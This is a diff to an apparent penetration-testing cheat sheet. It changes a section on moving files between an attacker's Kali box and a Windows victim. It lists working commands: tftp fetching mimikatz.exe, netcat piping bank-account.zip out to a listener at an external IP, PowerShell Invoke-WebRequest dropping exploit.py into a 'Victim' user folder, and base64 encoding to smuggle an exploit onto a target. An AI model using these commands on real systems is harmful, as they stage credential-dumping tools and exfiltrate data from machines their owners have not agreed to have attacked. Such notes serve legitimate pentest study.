@@ -43,12 +43,19 @@ Using MSF. Start MSF before starting these steps:
   	4. tftp -i 10.10.10.10 GET mimikatz.exe
 
 #NC (Windows to Kali)
-
-- Windows:
-- C:\> nc -nv 10.11.0.61 4444 < bank-account.zip
-
-- Kali:
-- nc -nlvp 4444 > bank-account.zip
+	Windows:
+	1. nc -nv 10.11.0.61 4444 < bank-account.zip
+	Linux:
+	2. nc -nlvp 4444 > bank-account.zip
+	
+#Powershell
+	1. Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
+	
+#Base64
+	local system:
+	1. cat exploit.py |base64
+	victim:
+	2. echo "base64string==" | base64 -d >> exploit.py
 
 
 LFI / RFI
